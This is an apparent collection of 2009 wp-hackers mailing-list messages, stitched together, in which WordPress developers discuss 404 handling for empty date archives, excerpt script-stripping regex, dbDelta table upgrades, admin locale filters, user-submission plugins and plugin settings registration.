But I would prefer to have it return 200 even if children don't have
posts either.

So basically, if it's a valid term/taxonomy than return 200 even if no
posts.

In the context of the WordPress 'framework', of a blog returning date
based-posts from a URI that has a specific meaning, then a URI that
was not generated by the system, by WordPress itself, can only
logically return a 404. "The resource was not found".

If you choose, through your theme and or plugins, to include other
data in this or any other response, then that it perfectly valid but
it is not a direct default function of WordPress.

Now, WordPress does have hooks in place to filter a 404. Take a look
at  the actions 'redirect_canonical'  and 'template_redirect'

By the way, Mike, you mention a calendar link which points to a month
with no posts. That must be either a non-WP calendar, one modified by
a plugin, or you have found a bug in the calendar code. The standard
calendar does not generate links for months in which there are no
posts.


To look at the issue from another perspective: That of an indexing
search engine. If it follows a URI with the intention of indexing the
resource on the other end of the URI, if it always gets back a 200 for
every possible URI, then the indexes will pretty soon fill up with
crap. You now have the situation when every possible date-based URI
from the year zero onwards is valid, presumably including the ones in
the future, forever!

 Imagine if your 'standard'  extra non-post content was a page full
adverts. Oh wait, we have that already, they are called spam sites,
and we all hate them.

So the correct response is 404, and the search engines can safely
choose to not index that page. Note that they can and will come back
to the same URI in case it becomes valid (when a 200 should be
returned).

Mike, I believe what you really need to do is hook one or both of the
actions above and return a 302 redirect to your 'invalid date handler'
page. Which might do something useful like suggest another link,
display a year calendar, or simply say, "Hey, no posts for this date,
but here are my tweets, and my flickr posts, some interesting
historical facts for this month, etc."

It should be 302 in case there ever are posts for that date, whereupon
those posts should be returned with 200 response code.

Not unless you code it that way.  Try this:

Anything from the month of the first post, to the present month, has a  
valid "month" archive page.

You're looking at it from an absolutist coder stance.  I'm looking  
from the end user's POV.  If example.com/blog/2008/06 is a valid  
archive page, and example.com/blog/2008/08 is a valid archive page,  
then I would expect example.com/blog/2008/07 to be valid as well, even  
if July has no posts.

I guess my main question is this:  CAN this reasonably be done in a  
plugin?  If it can, without being too grossly complicated, I would  
probably be fine leaving it to a plugin to fix if I wanted it.

Friendly FYI -- a proper diff file is created by the command-line  
"diff" function.  For posting patches to Trac, you should start with  
WordPress "trunk".  Basically what I do is this:

1) Save a copy of the file you're going to change -- maybe just append  
"-orig" to the end of it.

2) Make your changes to the file.

3) Use diff to compare the modified file to the "-orig" copy.  I pipe  
it to my text editor and save it from there.  Something like this:

diff ./original_file.php ./new_file.php | bbedit

That's off the top of my head, but pretty close.  Save the file with  
the .diff extension.

The reason this is the way to do it is that the Powers-What-Is can  
apply that patch with the "patch" command, rather than manually  
inserting your new code.

Actually, now that I'm using SVN, I use the SVN "diff" command  
instead.  It nicer because if I've changed more than one file, it can  
handle that better. :)

I'm assuming that the tag ID will correspond to the order in which the
tag was typed, so you can request tags ordered by ID.  Unfortunately,
although wp_tag_cloud() accepts an orderby argument, it overrides it.
So you'll have to use a callback function on the "get_tags" function,
as in the following example, to do what you want:

add_filter('get_tags', create_function('$t', 'return get_terms(
"post_tag", array("orderby" => "id") );'));
wp_tag_cloud();

But why should such an arbitrary 'rule' be *built into* WordPress?
Which is again what has been suggested on this thread.

I would disagree. From a user's point of view, they should expect a
user friendly response. Which might not be the same as 'valid'

One such response is, as I've suggested "what you gave me was invalid,
but here is something that is useful to you." That's human level
semantics.


Machine level (server to browser)  should either be "I couldn't find
what you asked for. Show this to your human" (404 with content) or "I
couldn't find what you asked for, go here instead" (302)

The actions I mentioned allow you to do exactly that.

But I still maintain that it is not a fix. Rather, additional
functionality above what WordPress does (and should do).

WordPress says "I cannot find any content for this date based URL" and
then gracefully allows you to provide some alternate content. Other
wise it does what it should do return 404 - no content found.


Remember WordPress only 'does' posts, pages, and links, they are it's
only content.

Agree, but what is currently presented (404 Not Found) is decidedly NOT a user friendly response.

> That's human level semantics.

That's what we are proposing, but that doesn't require a 404 be generated. 404 is more properly a protocol error not an application level response.

> couldn't find what you asked for. Show this to your human"

That's a false dichotomy. Presenting a 404 means "Resource Not Found" when the valid resource to serve is "There are no posts here."  That should get a 200.

> Remember WordPress only 'does' posts, pages, and links, they are 
> it's only content.

That's an extremely narrow viewpoint that will be proven wrong with almost 100% certainty as WordPress evolves.

Again at this point I am not trying to impose this on others but there should be an easy way for a themer or plugin dev to make it so.

Mike, I follow your overall argument, but what makes me question it is
that it seems to imply that there could be *nothing* that would
warrant a 404 response.  Since almost every possible request could be
a potential location for pages, posts, and other objects, shouldn't
they all be "X is not here" (200)?

> Again at this point I am not trying to impose this on others but there should be an easy way for a themer or plugin dev to make it so.

You can change the 404s using existing filters and action hooks,
unless I'm mistaken.

You have yet to explain what exactly is wrong (or user un-friendly)   
with a 404 response.

Though I can see a possible argument fot a 300, multiple choices,  
response, I agree with the many people on the list that a 404 is  
really the best possible response.

The user friendly-ness of of a 404 is related to the content you put  
on the page (which by default is minimal, I admit, but you could  
easily add more). And if, as you suggested previously, such a page  
were to include content from Twitter and other services, then you  
could easily change the 404 behavior with a plugin.

Actually 404 *is* an application level protocol response.

"The Hypertext Transfer Protocol (HTTP) is an application-level
protocol for distributed, collaborative, hypermedia information
systems."

-- from RFC2616

That's why I mentioned the server to browser part. That part must say
"what you gave me was invalid", that's what 404 is for. Otherwise my
'absurd' search engine scenario *will* (and does) happen.

But, you can of source present something nicer to the user.

That only holds if an "archive" with our without posts is something
WordPress considers content. It very clearly does not, and nothing in
it's history or future indicates it will.

And we are still back to the idea that every possible "archive" becomes valid.

Even if you restrict it to "date of earliest post until now" that is
still a lot of  'valid' URLs with no content.

This blog, (which used to be WordPress) http://www.pepysdiary.com/
would have over 124,000 such empty URI's  (127,000 possible days,
versus 3285 maximum diary entries)

It's not a viewpoint it's a fact based on exactly what the code does
at this moment in time.

As I mentioned there *is* an easy way to divert the standard 404
response and present a different one.

I see your point but what I was suggesting is more limited.  I was specifically referring to Monthly (and Yearly) archives where there is known and expected pattern to the URL structure.

If it's easy, this is a non-issue.  I have yet to discover how.

Point taken. Yes it is an "application level protocol" according to framers of the RFC so I misspoke. I was using the more colloquial use of the term meaning that HTTP is lower level compared to level at which most web developers and definitely end users operate. 

When the RFC framers used the term "application level protocol" they were referring to RESTful and HTTP RPC web service types of applications, NOT the higher level semantic behavior of a content management systems. Even so, the 404 response in a RESTful web app means "You Mr Client app made an error, follow your error handling procedure." If a RESTful web app were calling for the list of posts for a month the proper response shouldn't be "Mr Client you made an error", the proper response (in most cases IMO) should be "Here Mr Client is your list of posts, and that list is empty."

The more I look at this the more clear it becomes to me that 404 is just the wrong response for a validly formed URI request for a monthly archive. Even so, if I can fix it with a plugin I'll gladly do so rather than continue the debate.

If you were to think of your blog powered completely by HTML
(hand-coded), then returning 404 on months that have no posts makes
sense. Since you never made any posts that month, you would have never
created the archives for that month. Therefore, that page would not be
found, which is what 404 is for.

That's an oldie but a goodie ;)

I had the same issue with calendars when I built that site. Its been around
since July 2000 so there was potential for a whole lot of monthly "not
found" results. I got around this by making sure my archives only published
months for which there is content (you can see that here:
http://lynnepope.net/archives).

I remember having a similar discussion years ago with another open source
project. They decided that monthly archives should return a 200 response and
not send users to the 404 page. This was changed on the next release after
search engines started returning results for links like:
http://example.com/2300/01
I had one site that had thousands upon thousands of results in search
engines, for non-existent "content" dating from 1972 to 2300. (Search
engines are a bit smarter now, but not too smart!)

Search engines need a 40x response if content doesn't exist. Users just need
a useful 404 page that tells them how to quickly find related content or
seek help if they need it.

Here's what I would do if I wanted all month requests to have 200
response headers:

 add_action('wp', 'no_monthly_404s');

 function no_monthly_404s() {
        $m = get_query_var('m');
        $monthnum = get_query_var('monthnum');
        if ( ! empty( $m ) || ! empty( $monthnum ) )
                        status_header( 200 );
 }

Sorry, but I have to ask this...
If no posts existed for a monthly archive, where are the URL's to the
archive coming from? How would people end up following an URL to a
non-existent page?

The only place I can see the potential for this happening is if a site is
using a calendar that outputs links to non-existent archives. Surely that,
then is a calendar issue which should be fixed?

Call me dim if you like, but I just cant see how creating virtual pages for
non-existent content helps anyone (least of all search engines trying to
index content).

The OP is talking about someone typing/editing the URL by hand.  E.g. taking
http://blog.com/2007/03 and changing the "03" to "04" when there are no
posts in April of 2007.

At least two places:

1.) User's hacking URLs (which I and Jakob Neilsen believe is good UI: http://www.useit.com/alertbox/990321.html)

2.) A Custom Calendar.

Whether it needs to be "fixed" is based on whether you think it is broken.

Consider the use-case where a page has a "Add your own event for this month" link. 

Bottom line, I think we should be able to have virtual pages if we so desire and not be painted into a corner by WordPress because of someone else's view of what constitutes a 404.

That said, kudos to Austin Matzko for providing a solution which I will soon be testing.  Thanks Austin!

Such a page sounds like something made either by a plugin or a *very*  
custom theme -- either of which could then implement "empty archive  
pages" as part of the full functionality.

You've named some excellent examples of your case, but beyond the  
"hacked URLs should work" argument, none of them are core material.

In my opinion, the best *core* implementation would be to return the  
404, but *display* an "empty archive" page -- e.g. a page that says  
"there are no posts for this month", and links to the nearest adjacent  
months with posts.

 From the user end, this is a superior (friendlier) interface.  But as  
others have pointed out, we don't want Google cataloging archive pages  
that don't have any posts.  A 404 that looks like a "no posts" archive  
is the best of both worlds.

Or you could simply use John Godley's excellent Redirection plugin (
http://wordpress.org/extend/plugins/redirection/) and explicitly trap all
months you know don't have content and redirect them to either a landing
page or simply the next month with content.

Boom, problem solved.

Message-ID: <ED3900BB-5A12-4071-978E-924C8286AEB0@yoast.com>

Hey,

I've been "fighting" a bit with my excerpts in my new theme, as I have  
the nasty habit of sometimes adding inline script tags to my posts.  
Now I found that wp_trim_excerpt does strip_tags, but it does not  
remove the content within style and script tags, even though you  
probably want it too. I've solved it like this for now:

function yoast_clean_excerpt($text) {
	if (is_home() || is_archive()) {
		$text = preg_replace('/<script type=\"text\/javascript\">([^<]+)<\/ 
script>/','',$text);
		$text = preg_replace('/<style type=\"text\/css\">([^<]+)<\/ 
style>/','',$text);		
	}
	return $text;
}
add_filter('the_content','yoast_clean_excerpt',10,1);


But I'm wondering whether wp_trim_excerpt should do that by default...  
Any opinions?

Best,
Joost

Perhaps I'm missing the point completely, but if the loop in the relevant
theme template file simply includes an "else", eg this (much simplified,
just to illustrate the point)...

if (have_posts) : while (have_posts etc etc
// Post content
endwhile; else :
// "There are aren't any posts this month. I was too lazy to write one!"
endif;

Then no 404, and something reasonably useful is communicated to the user -
who then might be tempted to click on a real link in the sidebar etc. In
other words, it seems to me a template issue rather than anything
fundamentally flawed with how WP handles queries. Just my two centimes
worth. :-)

There was a similar discussion some time ago relating to author pages.  One problem with using the nick name is that it doesn't have to be unique whereas the username does.

The author login is also written in the permalink structure which displays
posts by a certain author: http://example.com/author/author-login/

Can't you apply a filter to the function that generates the class and remove
the author if it might be a security concern in your case?

That's not how it works. I've seen several themes that have an else and
still return a 404. The code in the else branch is never executed actually,
so I just delete it.

Frank,

The general concensus is that this form of "security" is security by
obscurity and has been discussed many times. This was also noted in a
previous thread of yours a while ago.

John.

It never makes it there. /wp-includess/template-loader.php finds that it is considered a "404" and bails.

Joost,

You should watch your regex for removing the script tags there...
"<" is still a valid character in javascript. So, your regex won't strip out script tags that are 
escaped with CDATA tags, or use the less than operator, or contain a string with the less than 
character.

A better bet may be to use (.+?), which will take out everything until it hits the (first) closing 
script tag.

Also, you may want to add the case-insensitive and dot-matches-all
modifiers (to catch script tags that go over more than one line), and
as Jason suggests, a lazy quantifier.  And you may as well get the
style elements in one swipe.

Subject: [wp-hackers] dbDelta Upgrade not working
Message-ID: <49B74BE3.5080404@gmail.com>

Hi,

I'm trying to upgrade the table structure for my plugin Top 10 to add an 
extra column to the existing table.

    // Upgrade table code
    $installed_ver = get_option( "tptn_db_version" );

    if( $installed_ver != $tptn_db_version ) {

     $sql = "CREATE TABLE " . $table_name . " (
         accessedid int NOT NULL AUTO_INCREMENT,
         postnumber int NOT NULL,
         cntaccess int NOT NULL,
         PRIMARY KEY  (accessedid)
     );";

       require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
       dbDelta($sql);

     $sql = "CREATE TABLE " . $table_name_daily . " (
         accessedid int NOT NULL AUTO_INCREMENT,
         postnumber int NOT NULL,
         cntaccess int NOT NULL,
         dp_date date NOT NULL default CURDATE(),
         PRIMARY KEY  (accessedid)
     );";

       require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
       dbDelta($sql);

       update_option( "tptn_db_version", $tptn_db_version );
   }

The extra column added is the dp_date date NOT NULL default CURDATE(), 
which isn't present in earlier versions. However, the upgrade isn't be 
processed, i.e. the extra column isn't added.

I've used the code from 
http://codex.wordpress.org/Creating_Tables_with_Plugins

The upgrade works only when I created a new table, but not to alter it.

Anybody have a clue as to why this isn't happening? Any solutions?

Thanks,
Ajay D'Souza

I disagree. Checking my server access logs I see that browsing to a monthly
archive - which has no posts - returns a 200 (archive.php with else branch
as mentioned previously).  Test was done with default permalinks, ie
/?p=123.

is there any way to exclude single images from an inline gallery? I can't
believe this gallery is somehow great but potentially missing this feature?

It must be there and i just don't see it, right? ;-)

I think there are two intertwingled issues here:

 * The HTTP status code [1] which WordPress responds with (currently
404 Not Found)
 * The user experience of coming across an archive with nothing in it

I would argue that the 404 status code is *absolutely* the correct
response here. Nothing has been found, so we send Not Found; if we
sent another response then Search Engines might start cataloguing this
page and that is (almost certainly) not what we want.

The user experience is another matter. Arguably when you come across
an archive which has no content you want to give the user some
response which is appropriate to the archive type, e.g. you might want
to point people to or show them a tag cloud for tag archive. For most
websites I would think that a user coming across an archive page which
has nothing on it is a pretty edge case scenario; how have they got
there? There's unlikely to be links from breadcrumbs, or "this post
published on {date}" type meta, etc. The only time I've had issues
with this has been for author archives; on one site we listed the
authors and wanted to link to their "home" archive page so people
could read their bios, etc, but WP didn't create those archives until
they'd written a post.

So in summary, I kinda see your point but I think you're dealing with
edge cases... and the core software doesn't need to deal with those
edge cases IMO.

Cheers,

S

Well, to alter an existing table, you would have to use the ALTER TABLE
statement, no? Or, delete the existing table first.

I was able to figure out the problem. I removed the default CURDATE() portion of the table.

dbDelta handles the upgrades without you needing to program specific alter statements.

    Well, to alter an existing table, you would have to use the ALTER TABLE
    statement, no? Or, delete the existing table first.

Depending on how much you want to remove, the wp_filter_nohtml_kses()  
function might do the trick. It strips scripts, styles, simple html,  
and nasty stuff, returning just plain old text.

Hi Frank,

It actually does not show the login-name/user_login it uses the
user_nicename for populating the class.. this value is just a filtered
version of the login-name/user_login.

This value can separately be changed (directly from DB or well you can
code yourself a plugin for diy) so you can still hide that information
from the public and of course you will solve the /author/<login>
disclosure permalink structure which scribu says.

There are some more trick to avoid disclosing the user_login but as
other people say security through obscurity it's not security but at
least it will delay those moth********... oohh well you get my point
;).

Thanks for your answer.
oh yes, i have read the code and i have see that: user_nicename
user_nicename is only a small filtered name and it is very easy to see this
login_name.

Yes, i have write a plugin for me to change this in the database. I think
this is not the problem. I think, many users use WordPress with many authors
and community and all peopple have the same problem. Maybe it is possible to
change the function for set the user_nicename and then is this problem past.

Best regards
Frank

Message-ID: <49B7DA59.6010302@yoast.com>

Hey,

does anyone here have a base class / function for creating WXR files in 
PHP? I need to create a WXR file from a custom database, and want to 
prevent doing any double work :)

Aaron Brazell seemed to have one[1] but I can't download it at the moment.

Also, I would be willing to pay (up to like 500 dollars) to anyone who 
can write a tool that let's me simply say convert this DB field into 
that WXR field, and adds some UI and options to concatenate stuff.

Best,
Joost

Hi again,

>From previous attempts to promote this related-ideas to go core... i
can tell you that this won't never happen.
Best shot you have is to ask for a plugin (filter) hook.

There is one filter for change it on-registration/insertion of a new
user which is called "pre_user_nicename"
But you will actually need some filter on comment-template.php
function get_comment_class which allows you to change this
over-the-fly.

However as i previously says, promoting hiding the information would
never happen but if you instead ask for a filter/hook then your
chances of getting to core that change will raise.

Regards.

None at all. Go nuts. The readme says which branch to use for  
deployment in the extend db, so keep that in mind if you are going to  
start using branches/tags for version numbers and have the latest  
version be the one people download (i.e. /2.0, /2.1, etc)

What about /wp-admin ? Not sure how long that's been around, but wp- 
load.php is relatively new. (2.3ish?)

Tricky. Even if you do find a common file, how will you find the root
of their WordPress install? Some people will have installed this into
the "blog" or other arbitrary named directory off the docroot, others
might be using a technique to store the WP files in a separate
directory while still having their blog appear on the root location of
their site [1].

However, as most people have suggested, the majority scenario is
probably the wp-admin directory off the root of the website.

Good luck.

Another way, is to check for the GENERATOR meta tag. Most themes  
implement this (or it comes for free with wp_head) and will say  
wordpress in it. You can script this too, if you are trying to  
automate it.

Subject: [wp-hackers] Static front page with pagination using wp_link_pages?
Message-ID: <128C6990-642F-4BA1-A4F1-6F5B891FEE1B@funroe.net>

If you have set a WordPress site to use a static front page and you  
paginate that page with nextpage the pagination will break.

I've worked with wp_link_pages, but since it uses get_permalink which  
uses get_page_link it will always return the home location. Which is  
correct, but it slaps the pagination on the end of the home link as http://mysite.com/2 
, etc. Those links are of course 404.

  I was looking to see if I could get the wp_link_pages function to  
properly use something like http://mysite.com/page-slug/2 for the  
paginated pages after page 1. I thought you could override using  
more_file, but that's not correct.

Anyone else banged their head on this one with out doing a custom  
wp_link_pages function? I didn't find this mentioned anywhere out  
there ->.

Message-ID: <1fa535a70903120052j299fc200uf20273ac06141c4f@mail.gmail.com>

I guess this is really an SQL question but I thought I'd ask here.

I'm writing a plugin which extends the user search/filter
functionality on the Users admin screen. It allows a user to filter
the results based on two custom user meta values. The [simplified] SQL
which retrieves the users is:

SELECT * FROM wp_users, wp_usermeta WHERE wp_usermeta.meta_key =
'key1' AND wp_usermeta.meta_value = 'value1'

That's all well and good for one meta value, but I am absolutely
stumped about how I can test for a second meta key/value pair which
must also be present. The problem is that the second meta_key will
have a different value to the first, and adding something like:

AND wp_usermeta.meta_key = 'key2' AND wp_usermeta.meta_value = 'value2'

will always return zero rows because you're trying to retrieve a row
with two different values for the same field (meta_key = 'key1' AND
meta_key = 'key2').

Any SQL experts out there that could give me a pointer?

Ah, I ran into the same problem for postmeta values. This is the what I came
up with:

WHERE CASE meta_key
WHEN 'key1' then meta_value = 'value1'
WHEN 'key2' then meta_value = 'value2'
END
GROUP BY ID
HAVING COUNT(ID) = 2

I want to use WP mainly as a directory, and put bookmarks on the home
page, and have single page for each bookmark

www.site.com?link_category=3  works ok (with a
register_taxonomy('link_category','link',array('hierarchical' => true,
'rewrite' => $rewrite)); )
www.site.com?link_id=5 doesn't work

Is there an easy way to create a single page for bookmark
I tried many ways
site.com?link_id=5 .. site.com?link=5 ...
and with or without (permalink on + addr_rewrite_tag +
$wp_rewrite->add_permastruct() )

Message-ID: <71ddd7490903120401t4aaafd16x639512a9dce4cfdd@mail.gmail.com>

Howdy all,
I'm trying to (back-of-the-napkin) work out how best to approach the
following problem using WordPress and I'd love to get some ideas as to the
best way forward.

I want to allow users to hit a simple form and be able to input information
that will then be browsable/serachable by others interested in the
information.  I need a minimum of overhead for the users to be able to
submit information, so just setting up a blog, allowing registrations and
then doing a custom write page isn't really going to cut it. As I've thought
about it, there are two ways to approach it.

1) Use comments as the basis for this effort, since an infrastructure for
submitting information in a drive-by capacity is already in place.

2) Create a form that has the full privileges of an Author role and allow
folks submissions to actually go in as full-fledged posts.

I'm leaning towards #1, an approach which has some decided downsides

a) No comment_meta makes storing additional information (in this case,
geolocation information and a few other values) problematic.

b) No good searching of comments through the native WordPress interface.

As a solution for a), I was thinking of putting a form in place that would
submit data to the comments tables and store the meta in the form of
shortcodes interior to the comment itself.  I would then apply shortcode
translations via an add_filter on the comment text when it came time to
display it.  b) has no good solution I can think of.

So I'm throwing this out there -- has anyone ever either seen something
similar implemented in WP (via plugins or simply radical custom reuse of the
underlying infrastructure) or even implemented something similar themselves?

Or, the alternative answers y'all might provide would be "Doug, you're
crazy, such a thing can't be done, and here's why" or even "What the heck
are you talking about?  Explain better!"

Hi,

I'm really curious to see how many people in the Netherlands are hacking on
Wordpress, so I'm thinking of organizing a WP hackers meetup in the Netherlands.
Probably somewhere in Utrecht (about half an hour by train from Amsterdam) in
May. The thing I envision is a get-together of plugin authors, wordpress bug
squasher and theme creators exchanging ideas and perhaps do some hacking on
Wordpress (bug-marathon?). Before I start organizing something like this I would
like to know if there's enough people interested in doing something like this?

ps: I'm traveling for a few days starting Friday. I will be able to check my
email after monday (2009-03-16) and respond.

All the best,

grtz

Why not go with that?

Create a custom write page with predefined custom fields, categories 
and/or tags and let your users write a post which can be submitted for 
moderation (or not, depends on your goal).

You could either create an external page (or a function, a widget...) 
for this, or "hack" admin's design (custom header and footer, unset all 
unnecessary menu items) so your users don't see a difference between 
admin and frontend.

You could also use the awesome TDO Mini Forms plugin

used it on a client site that wanted reader-submitted news stories for 
his site, and it worked beautifully.

Hi hackers. Someone said this after reviewing Wordpress: "There is only 
limited support for differentiation of user roles, with no easy way to 
support permissions based on section or type of content." If I wanted to 
point this person toward the best plugins that would allow more 
differentiation of user roles or permissions based on section/type of

I've got a copy of Aaron's WXR class (because I converted to Perl a 
while back for another project). I'll send it to you directly.

Oh yes, the Role Manager works fine in WordPress 2.7.1 and 2.8 bleeding
endge and give you all chances for different roles; create new roles and
change the roles. You can also set a objekt to/from a role.

I'd double that (but hey I'm the author of the plugin). You could
create a very simple form that appears on your theme that doesn't
require visitors to log in before they post or have access to the
Wordpress backend. It gets passed through Akismet to prevent spam
submissions or you can turn on moderation if you want.

If you have the info as posts in Wordpress then, you can leverage tons
of Wordpress plugins and themes to make it searchable and accessible.

This is precisely what I need and I'm pursuing it, though I need two things  
(and I haven't been able to grok how to do it from the TDOMF documentation):

1) Offer a select/drop-down with limited choices

2) Get Google Local info instead of straight Google Maps from Geo Mashup --  
ie, I want people to be able to enter "Target, Philadelphia, PA" and  
actually get back real GMaps coordinates.

Howdy y'all,Is there any easy/quick way to get at the WP Stats data for a
particular post or series of posts from within a plugin or theme?  Is it
possible to display a "Top Posts on This Site as Determined By
WordPress.com"? Or, is it possible to check on a per-post basis for such and
then output a modifier to one's theme code, allowing for a "This is a Top
Post" sort of a badge?

I'm basically looking for something akin to Alex King's Popularity Contest
that leverages the stats on WP.com.

A select/drop-down of what exactly?

A list of categories? (can do that with the category widget)
A Custom Field? (can be done via the Custom Field widget)
A selection of forms? (can be done via some simple JQuery code, I have
an example on the Support Forums if needs be)

TBH I'm not 100% sure how Geo Mashup works, it's not my plugin.
Someone else did an initial integration with it and I completed the
work and added to the core of TDOMF. As far as I understand, it stores
the local google map coordinates in Custom Fields on the post. The
GeoMashup Widget just provides a version of the interface that is
normally on the Wordpress edit screen on the form. It allows you enter
an address, like you're example above, and it puts a pin in it. Why do
you want to get the real co-ordinates rather than allow them to
dynamically choose it on a map?

FWIW I built a very simple plugin that nonetheless did a great job of
setting a 'post-thumbnail' for each post. Its a metabox that does
get_children for the post, shows the 'thumbnail' for any uploads and
lets you select which to use. it then saves that to a postmeta field
and offers display_thumbnail() to show them (or a filter option).

The reason I mention is that the process was shockingly simple and
enjoyable actually. The current system is pretty robust. To give users
more options for sizes I just added some text that says "Currently
your thumbnails are [width] x [height], click here to edit your
settings" and linked them to the media settings (where I also added my
own option about filter excerpts). Given how easy it was I'd say this
is easily plugin territory, there are just too many ways it could be
used for core to include it without just being confusing.

Message-ID: <A86E59D9-A207-4828-BECE-AA2F320238A1@gmail.com>

Hello List,
	I know WP a little bit but not so well to avoid asking for hints here.

For research purposes, I am surveying code repositories of the top 10  
web applications using a modified version of StatSVN. Of course, WP is  
the 1st!

Basically, I need to track source changes, over releases, in terms of  
"Lines of Code (LOC) matching a certain regexp".

The functions/lines I am interested in are those somehow involved in  
handling HTTP request/session/response parameters. Of course, I allow  
a certain roughness in the analysis.

I am trying to build a list of such functions/lines. What would you  
suggest to include? What would you grep for if you want to estimate  
the functions that are, even indirectly, related to processing of HTTP  
requests/sessions/responses?

Any input is greatly appreciated. Thanks in advance. Cheers,

Message-ID: <9aa12a490903152329n73200931i6967f8cd0c20439e@mail.gmail.com>

When I first looked at the WP code and it's new database structure I
thought it was developed having in mind possibility of custom post
types and custom taxonomies. Now I do not know what to think. It's the
second time I'm forced to implement custom taxonomy feature with WP
and again I got stuck with the same issue. Is there an important
reason behind impossibility of binding specific taxonomy to more then
one object type simultaneously? For example why there should be
separate taxonomy types for links and posts? I'm not involved in WP
development so maybe I miss some important point here. Anyone?

Mark:
The application I'm trying to build depends more upon what is AT the
coordinates than the coordinates itself, i.e., the type of store or
establishment located at the geo location is almost as important as where it
is.  I'd like people to be able to search by establishment name and not by
address/lat-long, as your average consumer of information doesn't know, nor
do they care what latitude and longitude are -- they simply want to be able
to find the closest establishment that offers product/service X.

Look at wp-includes/http.php and there are a couple of deprecated 
functions[1] in wp-includes/functions.php.

Jacob Santos

[1] Well, they are not really deprecated, since their purpose isn't 
obsolete, but they shouldn't be used, if at all possible.

Until version 2.7, WordPress mostly used a mixture of direct
fsockopen, remote fopen, and curl calls and methods of the Snoopy
class (found in wp-includes/class-snoopy.php).

Since 2.7 WP uses the WP_Http class and related methods in wp-includes/http.php

Subject: [wp-hackers] Registration of plugin options?
Message-ID: <49BE90F9.3050802@poplarware.com>

There was some talk around WP 2.7 about registration of plugin 
options, as I vaguely recall. Making it mandatory was dropped for 2.7. 
  What's happening in that regard for 2.8? Do we all need to update 
our plugins, or will they continue to work in 2.8?

I see a brief mention of registering settings on 
http://codex.wordpress.org/Settings_API, but all it has is the two 
registration functions listed -- no text, examples, mention of how/why 
to use them, etc.

There is also nothing in 
http://codex.wordpress.org/Writing_a_Plugin#Saving_Plugin_Data_to_the_Database 
or in http://codex.wordpress.org/Adding_Administration_Menus 
currently about registering options.

So could someone who knows what is going on either (a) update those 
pages in the Codex, or (b) explain here what is going on and ask for 
someone else to update them? or (c) (preferable) both explain here 
what we need to do to keep our plugins working and update the codex pages?

Thanks,
    Jennifer

Untested, but wouldn't a plugin with just:

if (is_admin()) {
   define ('WPLANG', '');
} else {
   define ('WPLANG', 'se');
}

work ?
(assuming "se" is the locale, I've used a totally random string here:)

Ditto on the info. I added the register_setting option for all my plugins
when upgrading them to 2.7, but I'm still not sure what that function
affected.

Indeed.  I have a whole section of code for register_settings ready to 
drop in to the plugin that I'm putting together now, but currently don't 
see a use for it.

There does seem to be a value if you want an automatically generated 
options section adding to an existing options page, but, as far as I can 
see, the same does not apply to adding a new options page - so that's 
not much use to me.

I can't see this coming into 2.8.  When or if it comes in it will need 
to be really well publicised in advance to avoid breaking a whole load 
of plugins. In my opinion the level of information around it at the 
moment is too low by a long way for such a severe change, it'd just 
cause chaos.

That said I could see it being useful to be able to automatically have 
my option fields sanitized, and if there was another function that could 
create an options page by option setting group that would be neat.

Subject: [wp-hackers] Internationalizing plugin meta-data...
Message-ID: <49BEE1E5.8080903@poplarware.com>

I'm trying to follow the instructions in 
http://codex.wordpress.org/I18n_for_WordPress_Developers for how to 
get the plugin meta-data into my plugin's POT file, for a plugin that 
is not in the repository.

This involves running a PHP file 
http://svn.automattic.com/wordpress-i18n/tools/trunk/makepot.php

That file doesn't run, though... First, there's a required file 
"not-gettexted.php", which isn't mentioned in the instructions -- this 
is not a huge deal, as it could be downloaded from the same location.

However, that second file requires "pomo/po.php" and "pomo/mo.php". 
Neither of those is in evidence. Where can I get these? And are there 
any other files required by these includes that I would need? And does 
this script work once the required files are there? Has anyone tested it?

Thanks,
    Jennifer

ps: I don't think this discussion belongs on the Polyglots mailing 
list. This is an issue for all plugin developers, as every plugin 
should be internationalized, whether the author wants to provide 
translations or not.

Hey Jen,

I am new on this list and don't know much about WordPress yet(except, of
course that it is awesome!)

take a look at [ http://svn.automattic.com/wordpress/trunk/wp-includes/pomo/]

I hope this is what your looking for. For some reason these are not in my
local install of wp, which i thought was the bleeding-edge-2.8. do not all
files get exported from svn? I thought i read something about a no export
list. not sure. as i said, i am still a noob.

If this is what your looking for, make sure to update the docs on the site
to make note of this.

Basically, you can do this, but it is seriously hackish way to do it.

<?php

__('Plugin Name', 'textdomain');
__('Plugin Description', 'textdomain');
__('Plugin Author', 'textdomain');
__('Plugin URL', 'textdomain');
// ...

?>

Jacob: Agreed -- that method is definitely hackish -- almost as bad as 
editing the POT file by hand and adding the strings myself. The main 
problem is maintaining the text in two places at once.

The method on the Codex page is the Official Right Way to do it, 
except that it doesn't work.

Samuel: thanks for the pointer to wp-includes -- hadn't noticed those 
files being in the WP distro. I will check and see if that works, and 
post back, tomorrow morning.

I do believe that the locale strings are more in the format of FR_fr  
(which is for French), so look at that before getting started.

Totally depends if the language is spread across various countries
actually (or something like this I believe)
In such a case it's "language_COUNTRY", for instance fr_FR, fr_BE
But there are a lot of "language" only: ar, ca, hr...

It's not short of writing a new plugin, but it's really short:

function different_locale_for_admin( $locale ) {
    return is_admin()? 'en_US' : sv_SE';
}

add_filter('locale', 'different_locale_for_admin');

Happy hacking,

Just checkout the whole
http://svn.automattic.com/wordpress-i18n/tools/trunk/ directory
somewhere and then run makepot.php. pomo is an external there, that's
why you didn't see in the directory listing.

I updated the docs.

Happy hacking,

...or, with a slight tweak this version retains the ability to set the
locale in the normal place, but forces admin to a hard-coded en_US:

*untested*

function different_locale_for_admin( $locale ) {
   return is_admin()? 'en_US' : $locale;
}

add_filter('locale', 'different_locale_for_admin');

I'll think I'll pack that up as a plugin and realease it just as

Subject: [wp-hackers] Thanks for being a part of my life
Message-ID: <1237280269.8733.8.camel@moonwood>

Just now, as I was browsing through my old Utilities folder on my file
server, I stumbled across this little gem:

-rwxr-xr-x 1 jeremy users 364970 2005-05-18 21:25 wordpress-1.5.1.zip

The zip file is dated 18th of May, 2005. Yes, it means I haven't cleaned
out my downloads since 2005.

That's the day I first downloaded WordPress, and discovered the joy that
it is. It was love at first sight, and WP 2.7 brings me closer to the
same "magic" I felt in 1.5.1 than any release between 2.0 and 2.6 did.

I would like to take this opportunity thank everyone who made WordPress
what it is today, and what it means to me.

WordPress has improved my writing skills, made me new friends, taught me
about open source software development, given me PHP/MySQL coding
skills, given me jobs, and welcomed me as part of its community. It
means a lot to me.

I know I haven't been active lately, but that's because of study. I
